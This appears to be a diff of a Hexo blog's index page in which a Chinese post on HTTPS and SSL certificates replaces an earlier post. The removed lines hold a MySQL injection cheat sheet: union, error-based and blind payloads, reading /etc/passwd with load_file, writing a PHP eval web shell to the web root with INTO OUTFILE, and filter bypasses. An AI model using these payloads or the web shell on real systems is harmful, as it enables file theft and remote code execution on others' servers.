@@ -64,10 +64,10 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-mysql注入" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-https证书" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2020/11/17/mysql%E6%B3%A8%E5%85%A5/" class="article-date">
-  <time datetime="2020-11-17T12:32:06.000Z" itemprop="datePublished">2020-11-17</time>
+    <a href="/2021/01/07/https%E8%AF%81%E4%B9%A6/" class="article-date">
+  <time datetime="2021-01-07T11:39:00.000Z" itemprop="datePublished">2021-01-07</time>
 </a>
     
   </div>
@@ -78,7 +78,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2020/11/17/mysql%E6%B3%A8%E5%85%A5/">mysql注入</a>
+      <a class="article-title" href="/2021/01/07/https%E8%AF%81%E4%B9%A6/">https证书</a>
     </h1>
   
 
@@ -86,40 +86,20 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="几种简单的sql注入方式"><a href="#几种简单的sql注入方式" class="headerlink" title="几种简单的sql注入方式"></a>几种简单的sql注入方式</h1><pre><code>判断是否存在注入
-单引号法     ?id=1&#39;
-逻辑法       ?id=1 and 1=1
-            ?id=1&#39; and &#39;1&#39;=&#39;1
-mysql注释符
-# //#会被解析为锚，所以要用#的URL编码%23
---空格
-/**/</code></pre>
-<h2 id="联合查询注入（union-slect）"><a href="#联合查询注入（union-slect）" class="headerlink" title="联合查询注入（union slect）"></a>联合查询注入（union slect）</h2><pre><code>?id=1 union select 1,2,3</code></pre>
-<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><pre><code>?id=1 and updatexml(1,concat(0x7e,version(),0x7e),1)</code></pre>
-<h2 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h2><pre><code>?id=1 and length(datebase())&gt;=4</code></pre>
-<h2 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h2><pre><code>?id=1 and if(length(database())&gt;1,sleep(5),1) //类似于三目运算</code></pre>
-<h2 id="MySQL读文件"><a href="#MySQL读文件" class="headerlink" title="MySQL读文件"></a>MySQL读文件</h2><pre><code>mysql读⽂件是⽤的 load_file() 函数：
-select load_file(&#39;/etc/passwd&#39;);
-select load_file(0x2F6574632F706173737764);</code></pre>
-<h2 id="MySQL写文件"><a href="#MySQL写文件" class="headerlink" title="MySQL写文件"></a>MySQL写文件</h2><pre><code>INTO OUTFILE函数写文件时会在每一行的结束自动加上换行符
-INTO DUMPFILE函数在写文件会保持文件得到原生内容，这种方式对于二进制文件是最好的选择
-select &#39;&lt;?php @eval($_POST[pass])?&gt;&#39; into outfile &#39;/var/www/html/muma.php&#39; ;
-select &#39;&lt;?php @eval($_POST[pass])?&gt;&#39; into DUMPFILE &#39;/var/www/html/muma.php&#39; ;
-select * from tdb_goods where goods_id=1 into outfile &quot;/var/www/html/muma.php&quot;
-LINES STARTING BY &#39;&lt;?php @eval($_POST[pass])?&gt;&#39;
-LINES STARTING BY &#39;写入的内容&#39;
-设置每⾏数据开头的字符，可以为单个或多个字符。默认情况下不使⽤任何字符。
-LINES TERMINATED BY &#39;写入的内容&#39;
-设置每行数据结尾的字符，可以为单个或多个字符。默认值是&quot;\n&quot;。</code></pre>
-<h2 id="绕过的几种方法"><a href="#绕过的几种方法" class="headerlink" title="绕过的几种方法"></a>绕过的几种方法</h2><pre><code>大小写绕过
-双写绕过
-内联注释绕过(/*! 语句*/)
-编码绕过</code></pre>
+        <p>#HTTPS</p>
+<pre><code>由于工作需要用到HTTPS协议，就去网上找了一下资料。略有心得，在此做个笔记，防止遗忘。
+
+关于HTTPS的资料网上有很多，简单来说就是HTTP+SSL证书。客户端在和服务器通信前会检查服务器的ssl证书。ssl证书不可篡改，因此只要ssl证书合法，通信便是可靠的。</code></pre>
+<p>##SSL证书原理<br>    下面稍微讲解一下SSL证书。首先，客户端怎么确定正在访问的网站是安全的网站?比如说怎么判断4399这个网站是否是安全的。</p>
+<pre><code>最简单的办法，在百度上搜一下4399，发现是一个正规网站，然后在电脑上建立一个文件，告诉电脑4399是一个安全的网站。显然这个方法是不可行的，如果在访问每个网站前都得考察一下的话，相信很多人会放弃上网。
+
+还有一种办法是引入一个可信的第三方机构，由第三方机构去考察这些网站，第三方机构为每一个安全的网站颁发“合格证明”——SSL证书。然后这些安全的网站将“合格证明”放在服务器上，客户端只要发现服务器上有SSL证书，说明该网站是安全的。</code></pre>
+<p><img src="/4399.png" alt="Alt text"><br>##SSL证书</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/17/mysql%E6%B3%A8%E5%85%A5/" data-id="ckhlzlmaa0000pktw0pqg3tex" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/01/07/https%E8%AF%81%E4%B9%A6/" data-id="ckjmubzal00033otw6qr3fltg" class="article-share-link">Share</a>
       
       
     </footer>
@@ -187,7 +167,7 @@ Cluster bomb：对每个位置分别设置字典，假如有两个位置，则�
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/10/13/burp%E4%B9%8BIntruder/" data-id="ckg7zlik30000cktw1p6baas9" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/10/13/burp%E4%B9%8BIntruder/" data-id="ckjmubzaf00003otwclpecr1i" class="article-share-link">Share</a>
       
       
     </footer>
@@ -231,7 +211,7 @@ Options：包含Burp扫描选项进行攻击的插入点，主动扫描引擎，
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/10/13/burp%E4%B9%8BScanner/" data-id="ckg7zlik70001cktw8x2ng2ch" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/10/13/burp%E4%B9%8BScanner/" data-id="ckjmubzaj00013otw1zo6d88r" class="article-share-link">Share</a>
       
       
     </footer>
@@ -277,7 +257,7 @@ Options：包含Burp扫描选项进行攻击的插入点，主动扫描引擎，
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/10/09/burp%E4%B9%8Bspider/" data-id="ckg2d8zqw0000igtwfyewdni5" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/10/09/burp%E4%B9%8Bspider/" data-id="ckjmubzal00043otwe8t31j23" class="article-share-link">Share</a>
       
       
     </footer>
@@ -332,7 +312,7 @@ Filter:过滤器</code></pre>
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/09/27/burp%E4%B9%8BProxy/" data-id="ckflaeesq0000qotwd1iq1lkj" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/09/27/burp%E4%B9%8BProxy/" data-id="ckjmubzak00023otw8vg08aht" class="article-share-link">Share</a>
       
       
     </footer>
@@ -384,12 +364,12 @@ hexo d 部署</code></pre>
 <h1 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h1><pre><code>This is [an example](http://example.com)inline link</code></pre>
 <p>this is <a target="_blank" rel="noopener" href="http://www.baidu.com/">an example</a></p>
 <h1 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h1><pre><code>![Alt text](/path/to/img.jpg)</code></pre>
-<p><img src="./timg.jpg" alt="惠惠"></p>
+<p><img src="../timg.jpg" alt="惠惠"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/09/20/%E5%AD%A6%E4%B9%A0Markdown%E8%AF%AD%E6%B3%95/" data-id="ckfdzklwf0000wotw2hk9331z" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/09/20/%E5%AD%A6%E4%B9%A0Markdown%E8%AF%AD%E6%B3%95/" data-id="ckjmubzam00053otwaapeh7zd" class="article-share-link">Share</a>
       
       
     </footer>
@@ -417,7 +397,7 @@ hexo d 部署</code></pre>
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li></ul>
     </div>
   </div>
 
@@ -430,7 +410,7 @@ hexo d 部署</code></pre>
       <ul>
         
           <li>
-            <a href="/2020/11/17/mysql%E6%B3%A8%E5%85%A5/">mysql注入</a>
+            <a href="/2021/01/07/https%E8%AF%81%E4%B9%A6/">https证书</a>
           </li>
         
           <li>
@@ -461,7 +441,7 @@ hexo d 部署</code></pre>
   
   <div class="outer">
     <div id="footer-info" class="inner">
-      &copy; 2020 John Doe<br>
+      &copy; 2021 John Doe<br>
       Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
     </div>
   </div>
